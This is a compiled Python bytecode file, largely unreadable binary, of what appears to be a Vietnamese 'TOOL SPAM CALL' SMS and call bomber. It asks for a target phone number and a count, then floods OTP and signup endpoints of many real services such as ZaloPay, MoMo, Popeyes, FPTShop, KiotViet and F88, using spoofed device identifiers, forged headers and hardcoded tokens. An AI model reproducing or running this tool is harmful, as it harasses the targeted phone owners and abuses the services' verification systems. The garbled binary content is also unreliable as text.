�
    ��d�`  �                   �d  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dl	Z	d dl
Z
d dlZd dlmZ d dlZd dlZd dlmZ d dlZd dlZd dlZd dlZd dl
Z
d dl Z d dlZd dlmZ d dl
mZmZmZ  ej        d�  �         dZd	Zd
ZdZdZdZdZdZd�                     g d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d�e� �d��  �        Z!e!D ]@Z"ej#        �$                    e"�  �         ej#        �%                    �   �           ed�  �         �A e&d�  �        Z' e( e&d�  �        �  �        Z) e e(d �  �        �!�  �        Z ej*        �   �         Z+d"d#iZ,d$e'iZ-d%d&e'd'd(�         z   d)�Z.g d*�Z/e'e/v r e0d+�  �          e1�   �          d,d-d.d/d0d1d2d3d4d5d6d7d8d9�Z2d$d:e'd'd(�         z   iZ3d;d3 e4e+�  �        d<d=d>d?d@dA�Z5dBe'iZ6dC� Z7dD� Z8dE� Z9dF� Z:dG� Z;dH� Z<dI� Z=dJ� Z>dK� Z?dL� Z@dM� ZAdN� ZBdO� ZCdP� ZDdQ� ZEdR� ZFdS� ZGdT� ZHdU� ZIdV� ZJdW� ZKdX� ZLdY� ZMdZ� ZNd[� ZOd\� ZPd]� ZQd^� ZRd_� ZSd`� ZTda� ZUdb� ZVdc� ZWdd� ZXde� ZYdf� ZZdg� Z[dh� Z\di� Z]dj� Z^dk� Z_dl� Z`dm� Zadn� Zbdo� Zcdp� Zddq� Zedr� Zfds� Zgdt� Zhdu� Zidv� Zjdw� Zkdx� Zldy� Zmdz� Zn ene'e)�  �         dS ){�    N)�ThreadPoolExecutor)�datetime)�sleep)�search)�choice�randint�shuffle�clearz[1;37mz[1;32mz[1;34mz[1;31mz[1;33mz[1;35mz[32;5;245m[1m[38;5;51mu'   [1;31m[[1;37m×.×[1;31m] [1;37m➩� ui  [1;36m

  _______ ____   ____  _         _____ _____        __  __ 
 |__   __/ __ \ / __ \| |       / ____|  __ \ /\   |  \/  |
    | | | |  | | |  | | |      | (___ | |__) /  \  | \  / |
    | | | |  | | |  | | |       \___ \|  ___/ /\ \ | |\/| |
    | | | |__| | |__| | |____   ____) | |  / ____ \| |  | |
    |_|  \____/ \____/|______| |_____/|_| /_/    \_\_|  |_|
                                                           
[1;31m────────────────────────────────────────────────────────────
�[z=.=z] zTOOL SPAM CALL
z] [1;35mADMIN: u   KhanhNguyen9872  
z!] [1;36mZALO: [1;31mUnknown   
z] [1;32mFacebook:    zhttps://fb.me/khanh10a1    
z	README:  u�   Xin chao ban da den voi tool spam!           
[1;31m────────────────────────────────────────────────────────────

g����Mbp?uK   [1;31m[[1;37m</>[1;31m] [1;32mNhập Số Cần Spam:[1;33m ~>[1;36m uI   [1;31m[[1;37m</>[1;31m] [1;37m[1;32mSố Lượng:[1;33m ~>[1;36m i�� )�max_workers�
user-agentzsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36�phone_number�registerz+84�   �   )�feature�phone)�
0587163009�	587163009�84587163009�
0363918366�	363918366�84363918366�
0335295153u   Số này không thể spamzapi.zalopay.vnz�Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1z	iPhone8,2�iphone3xzBearer �IOS�off�*/*z7.13.1zvi-VN;q=1.0, en-VN;q=0.9zMZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2�NATIVEz14.6)�Hostzx-user-agentzx-device-modelz	x-density�authorizationzx-device-oszx-drsite�acceptzx-app-version�accept-languager   z
x-platformzx-os-version�0zmoca.vn�XMLHttpRequest�vi�2zP_IOS-2.10.42z+Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00))r!   �AcceptzDevice-Token�X-Requested-With�Accept-LanguagezX-Moca-Api-Version�platform�
User-Agent�phoneNumberc                 �   � d}d}d}t          d| d�  �        D ]0}|t          j        |�  �        z  }|t          j        |�  �        z  }�1|S )N�
0123456789�3abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZr   r   �   )�range�randomr   )�length�number�alpha�id�is        �<x>�random_stringr;   ]   s[   � �!�F�I�E��B��1�V�A�&�&� +� +���f�m�F�+�+�+���f�m�E�*�*�*����I�    c                 ��   � t          j        dt          t          ��  �        �                    �   �         d         d         }d| dd�         z   |d�}t          j        d	t          |�
�  �        j        }d S )Nz.https://api.zalopay.vn/v2/account/phone/status��params�headers�data�send_otp_tokenr%   r   r   )r   rB   z%https://api.zalopay.vn/v2/account/otp�r@   �json)�requests�getr?   r@   rD   �post�text)r   �token�	json_data�responses       r:   �zlpayrL   e   sq   � �	��F�v�_f�	g�	g�	g�	l�	l�	n�	n�ou�	v�  xH�  
I��!�%��"��+�o��F�F���M�A�7�Yb�c�c�c�h���r<   c                 �  � t          t          t          j        �   �         dz  �  �        �  �        }t          �   �         }t	          �   �         }t          �   �         }t          dd�  �        }t          �   �         }i dd| dd�         z   �dd	�d
|� d��dd�d|�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!d| dd�         z   |d"d#d$d%d&d'ddd(d)|d*��d+d,||d|d|d-dddd.��}i dd| dd�         z   �dd/�d
|� d��dd�d|�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!d| dd�         z   |d"d#d$d%d&d'ddd(d)|d*��d+d0di�}d1dd1d2d	d3d4d5ddd6d7�}	t          j        |�  �        }t          j        |�  �        }t          j
        d8|	|�9�  �        j         t          j
        d:|	|�9�  �        }
	 |
�                    �   �         }
d S #  |
j        }
Y d S xY w);Ni�  �   �>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ�userr%   r   r   �msgType�SEND_OTP_MSG�cmdId�000000�langr'   �time�channel�APP�appVeriVy  �appCodez3.1.6�deviceOS�ANDROID�buildNumberr   �appIdzvn.momo.platform�resultT�	errorCode�	errorDescr   �momoMsgz(mservice.backend.entity.msg.RegDeviceMsg�Vietnam�084�CPH1605�23�mt6755�OPPO�452�Android)�_classr6   �imei�cname�ccode�device�firmware�hardware�manufacture�csp�icc�mcc�	device_os�	secure_id�extra�SENDz"oppo cph1605mt6755b6z9qwrwhuy9yhrk)�action�rkey�AAID�IDFA�TOKEN�	SIMULATOR�SECUREID�MODELID�isVoice�REQUIRE_HASH_STRING_OTP�checkSum�CHECK_USER_BE_MSGr�   �	undefinedzBearer undefinedzapi.momo.vnzokhttp/3.14.17�31062�application/json)�agent_id�
sessionkey�
user_phoner"   �msgtyper!   r-   �app_version�app_coderv   �Content-Typez=https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG�r@   rA   z7https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG)�int�roundrV   �getimei�get_SECUREID�	get_TOKEN�generateRandomStringrD   �dumpsrE   rG   rH   )r   �	microtimerl   �secureidrI   r{   �aaidrA   �data1�h�ts              r:   �momor�   j   si  � ��E�$�)�+�+��,�-�-�.�.�I��9�9�D��~�~�H��;�;�E���$d�e�e�D��9�9�D�,��s�5��2��;��,��>�,� 	�I�%�%�%�,� 	��	,�
 	�	�,� 	�5�,� 	�%�,� 	�7�,� 	�I�,� 	�q�,� 	�#�,� 	�$�,� 	�Q�,� 	�R�,� 	�@��%��"��+�o������ �!����"�!�
� 
�,�> 	������� �;��'+��
� 
�?,�D�Z"��s�5��2��;��"��&�"� 	�I�%�%�%�"� 	��	"�
 	�	�"� 	�5�"� 	�%�"� 	�7�"� 	�I�"� 	�q�"� 	�#�"� 	�$�"� 	�Q�"� 	�R�"� 	�@��%��"��+�o������ �!����"�!�
� 
�"�> 	���
�?"�E�H !��"�,�"��'����+�	� 	�A� �:�d���D��J�u���E��M�Q�Z[�af�g�g�g�l�l���O�XY�_c�d�d�d�A���F�F�H�H�������F�������s   �%F; �;	Gc                 �T   � d�                     t          j        || ��  �        �  �        S )Nr   ��k��joinr4   �choices)r5   �minhs     r:   r�   r�   �   s#   � ��7�7�6�>�$�&�1�1�1�2�2�2r<   c                  �T   � d�                     t          j        dd��  �        �  �        S )Nr   �0123456789abcdef�   r�   r�   � r<   r:   r�   r�   �   s$   � ��7�7�6�>�"4��;�;�;�<�<�<r<   c                  ��   � t          dd�  �        dz   t          dd�  �        z   dz   t          dd�  �        z   dz   t          dd�  �        z   dz   t          dd�  �        z   S )N�   r�   �-�   �   �r�   r�   r<   r:   r�   r�   �   s�   � ���#5�6�6�s�:�;O�PQ�Se�;f�;f�f�gj�j�k�  AB�  DV�  lW�  lW�  W�  X[�  [�  \p�  qr�  tF�  \G�  \G�  G�  HK�  K�  L`�  ac�  ew�  Lx�  Lx�  x�  xr<   c                  �  � t          dd�  �        dz   t          dd�  �        z   dz   t          dd�  �        z   dz   t          dd�  �        z   dz   t          dd�  �        z   dz   t          dd�  �        z   dz   t          d	d�  �        z   dz   t          dd�  �        z   d
z   t          dd�  �        z   dz   t          dd�  �        z   S )NrN   rO   �:�	   r�   �   r�   �   �5   �_r   r�   r�   r�   r<   r:   r�   r�   �   s�  � ���$d�e�e�fi�i�j~�  @A�  CC�  kD�  kD�  D�  EH�  H�  I]�  ^`�  bb�  Ic�  Ic�  c�  dg�  g�  h|�  }�  AA�  hB�  hB�  B�  CF�  F�  G[�  \]�  __�  G`�  G`�  `�  ad�  d�  ey�  z{�  }}�  e~�  e~�  ~�  B	�  B	�  C	W	�  X	Z	�  \	\
�  C	]
�  C	]
�  ]
�  ^
a
�  a
�  b
v
�  w
x
�  z
z�  b
{�  b
{�  {�  |�  �  @T�  UW�  YY�  @Z�  @Z�  Z�  [^�  ^�  _s�  tu�  ww�  _x�  _x�  x�  xr<   c                 �R   � t          j        dt          t          ��  �        j        }d S )NzMhttps://micro-services.vntrip.vn/core-user-service/verification/request/phonerC   )rE   rG   �uarJ   rH   )r   �response_vntrips     r:   �vntripr�   �   s2   � ��=�!p�z|�  DM�  N�  N�  N�  S���r<   c           	      �   � t          j        di dd�dd�dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%d&d'��d(| d)d)d*��+�  �        j         d S ),Nz1https://products.popsww.com/api/v5/auths/registerr!   zproducts.popsww.com�content-length�89�	profileid�62e58a27c6f857005396318f�sec-ch-ua-mobile�?1r"   a/  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gwzx-env�
production�content-typer�   rU   r'   zsub-api-versionz1.1r   zxMozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36zapi-key�5d2300c2c69d24a09cf5b09br,   �wap�sec-ch-ua-platform�"Linux"r#   r   �originzhttps://pops.vn�sec-fetch-site�
cross-site�sec-fetch-mode�cors�emptyzAhttps://pops.vn/auth/signin-signup/signup?isOffSelectProfile=true�gzip, deflate, br)�sec-fetch-dest�referer�accept-encodingr   �Abcxaxgh)�fullName�account�password�confirmPasswordrC   �rE   rG   rH   �r   s    r:   �popr�   �   s�  � �	��B�  MB�V�Uj�  MB�k{�  ~B�  MB�  CN�  Pj�  MB�  k}�  C�  MB�  DS�  UF�  MB�  GN�  P\�  MB�  ]k�  m�  MB�  @F�  HL�  MB�  M^�  `e�  MB�  fr�  tn�  MB�  ox�  zT�  MB�  U_�  af�  MB�  g{�  }H�  MB�  IQ�  SX�  MB�  Ya�  ct�  MB�  uE�  GS�  MB�  Td�  fl�  MB�  F�  RZ�  nA�  MB�  MB�  MB�  VX�  di�  u�  R\�  J]�  J]�  _�  _�  _�  d�  d�  d�  dr<   c                 �   � dddddddddd	d
ddd�}ddddddddddddddd�}| dddd�}t          j        d |||�!�  �        }d S )"Nz1.1.1399171366.1685593865zGA1.2.601043050.1685593865�1zGA1.1.1352914107.1685593865z%GS1.1.1685593865.1.0.1685593865.0.0.0�
1685593865� 3060068c024c57cf5bccf43037278ef8r   r%   zfb.1.1685593872828.2142938916z%GS1.1.1685593865.1.1.1685593885.0.0.0z&GS1.1.1685593865.1.1.1685593885.40.0.0)�_gcl_au�_gidz_gat_UA-106834068-1z_gat_UA-149855316-1�_ga�_ga_Y4V7XHSR6R�__admUTMtime�__uidac�__iid�__su�_fbp�_ga_4YCG78W1LS�_ga_X3WSB3MZGLzapi.popeyes.vnr�   �8vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5zhttps://popeyes.vnzhttps://popeyes.vn/�A"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"�?0�	"Windows"r�   r�   �	same-site�oMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36�WebApp)�	authorityr#   r$   r�   r�   r�   �	sec-ch-uar�   r�   r�   r�   r�   r   zx-client�tozlon xinhzhihi@gmail.com)r   �	firstName�lastName�emailz&https://api.popeyes.vn/api/v1/register��cookiesr@   rD   �rE   rG   �r   r�   r@   rJ   rK   s        r:   �poyr�   �   s�   � �.�,�"�"�,�A�$�5���/�A�B�� �G�" &�$�U�*�&�(�X� �)�!� �%� H��� �G�& ���!�	� �I� �}�E�w�`g�nw�x�x�x�H�H�Hr<   c           
      �   � t          j        di dd�dd�dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�| d"d#d$d%d&��'�  �        j         d S )(Nz>https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VNr!   zapi.alfrescos.com.vnr�   �124r$   zvi-VNr�   r�   r   �xMozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36r�   r�   r#   �!application/json, text/plain, */*�	brandcode�	ALFRESCOS�
devicecode�webr�   �	"Android"r�   zhttps://alfrescos.com.vnr�   r�   r�   r�   r�   r�   r�   zhttps://alfrescos.com.vn/r�   r�   � add789229e0794d8508f948dacd710aer   l   �?�_
r2   )r.   �
secureHash�deviceId�sendTime�typerC   r�   r�   s    r:   �alfresr	    s�  � �	��T�  _z
�_e�g}�  _z
�  O�  QV�  _z
�  Wh�  jq�  _z
�  rD�  FJ�  _z
�  KW�  YS�  _z
�  Tb�  dv�  _z
�  w�  Ad�  _z
�  ep�  r}�  _z
�  ~J�  LQ�  _z
�  Rf�  hu�  _z
�  v~�  @Z�  _z
�  [k�  mx�  _z
�  yI	�  K	Q	�  _z
�  R	b	�  d	k	�  _z
�  l	u	�  w	R
�  _z
�  S
d
�  f
y
�  _z
�  RW�  eG�  SU�  an�  vw�  Bx�  Bx�  z�  z�  z�  �  �  �  r<   c                 �l   � t          j        ddddddddd	d
d�	dd| dd�         z   i��  �        j         d S )Nz.http://m.tv360.vn/public/v1/auth/get-otp-loginz
m.tv360.vn�
keep-aliverf   r�   z�Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36r�   zhttp://m.tv360.vnz4http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F�gzip, deflate)	r!   �
Connection�Content-Lengthr)   r-   r�   �Origin�Referer�Accept-Encoding�msisdnr%   r   r   rC   r�   r�   s    r:   �tv360r    s�   � �	��?�R^�my�  MQ�  \�  Nu�  FX�  cv�  B}�  Q`�  Ja�  Ja�  jr�  sv�  w|�  }~�  A	�  }A	�  wB	�  sB	�  iC	�  E	�  E	�  E	�  J	�  J	�  J	�  J	r<   c                 �   � ddddd�}i dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�}| dd&d'�}t          j        d|||�(�  �        }d S ))N�Server-IPv2z<V0dwq4Fn4o1GNyxFv5htNHDZ2vZPGEAM53zuseO7Fe0-1686142646-0-160z1.1.407087509.1686353305zGA1.2.663989590.1686353305)�serverChoice�cf_clearancer�   r�   r�   ztobizzx.xyzr#   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7r$   �Avi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6,zh-CN;q=0.5,zh;q=0.4�cache-control�	max-age=0r�   �!application/x-www-form-urlencodedr�   zhttps://tobizzx.xyzr�   zhttps://tobizzx.xyz/tools/r�   �A"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"r�   r�   r�   r�   r�   �documentr�   �navigater�   �same-origin�sec-fetch-userr�   �upgrade-insecure-requestsr�   r   zoMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36�	tobiowner�r   �
ten_server�key�r�   r@   rA   r�   �r   r�   r@   rA   rK   s        r:   �tobir)    s"  � �%�V�-�+�	� �G���]���  \�� 	�^�� 	��	�
 	�;�� 	�'�� 	�/�� 	�X�� 	�D�� 	�k�� 	�*�� 	�*�� 	�-�� 	�$��  	$�S�!�" 	�  H�#�G�* �#��� �D� �}�9�7�T[�bf�g�g�g�H�H�Hr<   c                 ��   � t          j        di dd�dd�dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�t          j        d$d%d&| d'd(�         d)��  �        �*�  �        j         d S )+Nz6https://latte.lozi.vn/v1.2/auth/register/phone/initialr!   zlatte.lozi.vnr�   �101�	x-city-id�50r$   �vi_VNr�   r�   r   r�   r�   r�   �x-lozi-clientr�   �x-access-token�unknownr�   r  r#   r   r�   �https://loship.vnr�   r�   r�   r�   r�   r�   r�   zhttps://loship.vn/r�   r�   �Android 8.1.0�Chrome/104.0.0.0�84r   r   �ro   r,   �countryCoder.   r�   �rE   rG   rD   r�   rH   r�   s    r:   �loshipr9  9  s�  � �	��G�  RQ
�RX�Zi�  RQ
�jz�  }B�  RQ
�  CN�  PT�  RQ
�  Uf�  ho�  RQ
�  pB�  DH�  RQ
�  IU�  WQ�  RQ
�  R`�  bt�  RQ
�  uD�  FI�  RQ
�  JZ�  \e�  RQ
�  fz�  |I�  RQ
�  JR�  TY�  RQ
�  Zb�  dw�  RQ
�  xH�  JV�  RQ
�  Wg�  io�  RQ
�  p@	�  B	I	�  RQ
�  J	S	�  U	i	�  RQ
�  j	{	�  }	P
�  RQ
�  X
\
�  X
b
�  m
|
�  HZ�  im�  |A�  BC�  DF�  BF�  |G�  c
H�  c
H�  X
I�  X
I�  J�  J�  J�  O�  O�  O�  Or<   c                 �   � dddddd�}i dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�}| d'd(d)d*�}t          j        d|||�+�  �        }d S ),Nz1.1.1012218881.1684835781zfb.1.1684835781515.1677166536zGA1.2.1408134411.1685940951z%GS1.1.1685959550.3.0.1685959550.0.0.0zGA1.2.77743250.1684835781)r�   r�   r�   �_ga_CDVH4VH813r�   r�   zspamcallsms.clickr#   r  r$   r�   r  r  r�   r  r�   zhttps://spamcallsms.clickr�   zhttps://spamcallsms.click/r�   z@"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"r�   r�   r�   r�   r�   r  r�   r  r�   r   r!  r�   r"  r�   r   zoMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36�
admin07ntt�apiv5r   )r   �api_key�option�submitr'  r�   r(  s        r:   r�   r�   <  s)  � �.�/�-�A�*�� �G���(���  \�� 	�U�� 	��	�
 	�;�� 	�-�� 	�/�� 	�W�� 	�D�� 	�k�� 	�*�� 	�*�� 	�-�� 	�$��  	$�S�!�" 	�  H�#�G�* ����	� �D� �}�9�7�T[�bf�g�g�g�H�H�Hr<   c                 ��   � t          j        di dd�dd�dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d�d!d"�t          j        d#d$d%| d&d'�         d(��  �        �)�  �        }d S )*Nz(https://mocha.lozi.vn/v6/invites/use-appr!   zmocha.lozi.vnr�   �47r,  r-  r$   r.  r�   r�   r   zzMozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36r�   r�   r/  r�   r0  r1  r�   r  r#   r   r�   r2  r�   r�   r�   r�   r�   r�   r�   r�   r�   r3  r4  r5  r   r   r6  r�   )rE   rG   rD   r�   �r   rK   s     r:   �	oldloshiprD  a  s�  � ��}�G�  RQ
�RX�Zi�  RQ
�jz�  }A�  RQ
�  BM�  OS�  RQ
�  Te�  gn�  RQ
�  oA�  CG�  RQ
�  HT�  VR�  RQ
�  Sa�  cu�  RQ
�  vE�  GJ�  RQ
�  K[�  ]f�  RQ
�  g{�  }J�  RQ
�  KS�  UZ�  RQ
�  [c�  ex�  RQ
�  yI�  KW�  RQ
�  Xh�  jp�  RQ
�  qA	�  C	J	�  RQ
�  K	T	�  V	i	�  RQ
�  j	{	�  }	P
�  RQ
�  X
\
�  X
b
�  m
|
�  HZ�  im�  |A�  BC�  DF�  BF�  |G�  c
H�  c
H�  X
I�  X
I�  J�  J�  J�H�H�Hr<   c                 �`   � t          j        ddddddddd	d
dddddd�d| i��  �        j         d S )Nz9https://fptshop.com.vn/api-data/loyalty/Home/Verificationzfptshop.com.vn�16r   �0application/x-www-form-urlencoded; charset=UTF-8r&   r�   r�   r�   zhttps://fptshop.com.vnr   r�   r�   zhttps://fptshop.com.vn/r�   )r!   r�   r#   r�   �x-requested-withr�   r   r�   r�   r�   r�   r�   r�   r�   r   r�   r�   r�   s    r:   �fptrI  d  s�   � �	��J�]m�  AE�  PU�  f]�  rB�  W[�  jd�  {F�  Qi�  |I�  \b�  u|�  H	a	�  u	H
�  UI
�  UI
�  Q
X
�  Y
^
�  P
_
�  `
�  `
�  `
�  e
�  e
�  e
�  e
r<   c                 ��   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!d"d#d$��}d%d&d'd(d)d*d+d,d-d.d/d0d1d2d3�}d4d5d6d7d8d5d9d:d;d"| d<�}t          j        d=|||�>�  �        }d S )?N�AKA_A2�Az
gkvas-uuidz$b1b6bfdd-724e-449f-8acc-f3594f1aae3fzgkvas-uuid-d�1687347271111z	kvas-uuidz$1fdbe87b-fe8b-4cd5-b065-0900b3db04b6zkvas-uuid-d�1687347276471z
kv-sessionz$52268693-9db7-4b7d-ab00-0f5022612bc5zkv-session-d�1687347276474r�   zfb.1.1687347277057.810313564�_hjFirstSeenr�   �!_hjIncludedInSessionSample_563959�_hjSession_563959zteyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==�_hjAbsoluteSessionInProgress�_tt_enable_cookie�_ttp�idt42AWvO5FQ_0j25HtJ7BSoA7Jr�   zGA1.2.1225607496.1687347277�_hjSessionUser_563959zteyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==�_ga_6HE3N545ZWz&GS1.1.1687347278.1.1.1687347282.56.0.0z%GS1.2.1687347283.1.1.1687347283.0.0.0z$4c8714f2-5161-4721-c213-fe417c49ae65�65zGA1.2.1568204857.1687347277)�_ga_N9QLKLC70S�	_fw_crm_v�parentr�   zwww.kiotviet.vn�.application/json, text/javascript, */*; q=0.01r�   rG  zhttps://www.kiotviet.vnz https://www.kiotviet.vn/dang-ky/zA"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"r�   r�   r�   r�   r   zoMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36r&   �r�   r#   r$   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   rH  z+84972936627�bancainaynezCai Nitzahihi123982@gmail.comu   An Giang - Huyện Châu Phú�
0972936627u   Điện thoại & Điện máyr   )r   �code�namer�   �zone�merchant�username�industry�ref_code�industry_id�phone_inputzEhttps://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.phpr'  r�   r(  s        r:   �kiotrj  g  s�  � ���#���<�� 	��� 	�;�	�
 	��� 	�<�� 	��� 	�.�� 	��� 	,�S�� 	�  T�� 	'��� 	�S�� 	�-�� 	�-��  	 �  "X�!�" 	�B�#�$ B�;��,�+� � �G�2 '�B�U�J�+�5�X� �)�!� �'� H�,�� �G�&  ���(�/�!� �4����� �D� �}�O����	� � �H�H�Hr<   c                 �   � t          j        di dd�dd�dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"| d#d$�         z   d%d&d'��(�  �        j         d S ))NzMhttps://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTPr!   zapigateway.f88.vnr�   �595zcontent-encoding�gzip�traceparentz700-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01r�   r�   r"   zBearer nullr�   r�   r   r�   r�   r�   r#   r   r�   zhttps://online.f88.vnr�   r�   r�   r�   r�   r�   r�   zhttps://online.f88.vn/r�   r�   r%   r   r   a  03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3�Online)r.   �recaptchaResponse�sourcerC   r�   r�   s    r:   �f88rr  �  s�  � �	��^�  iV�io�  rE�  iV�  FV�  X]�  iV�  ^p�  rx�  iV�  yF�  HA�  iV�  BT�  VZ�  iV�  [j�  ly�  iV�  zH�  J\�  iV�  ]i�  ke�  iV�  fz�  |G�  iV�  HP�  RW�  iV�  X`�  by�  iV�  zJ	�  L	W	�  iV�  X	h	�  j	p	�  iV�  q	A
�  C
J
�  iV�  K
T
�  V
n
�  iV�  o
@�  BU�  iV�  lo�  pu�  vw�  xz�  vz�  p{�  l{�  P`�  jr�  ]s�  ]s�  t�  t�  t�  y�  y�  y�  yr<   c                 �   � t          j        dddddddddd	d
ddddd�t          j        dd| dd�         z   i�  �        ��  �        j         d S )Nz-https://api.vayvnd.vn/v1/users/password-resetzapi.vayvnd.vn�22r�   r'   r�   r�   r  zhttps://vayvnd.vnr�   r�   r�   zhttps://vayvnd.vn/r�   )r!   r�   r#   r�   r$   r�   r   r�   r�   r�   r�   r�   r�   r�   �loginr%   r   r   r�   r8  r�   s    r:   �call1rv  �  s�   � �	��>�Q`�sw�  CU�  fx�  LP�  ei�  xr�  IV�  at�  GR�  ek�  ~E�  Qe�  yL	�  IM	�  IM	�  T	X	�  T	^	�  `	g	�  h	k	�  l	q	�  r	s	�  t	v	�  r	v	�  l	w	�  h	w	�  _	x	�  T	y	�  T	y	�  z	�  z	�  z	�  	�  	�  	�  	r<   c                 �x   � t          j        ddddddddd	d
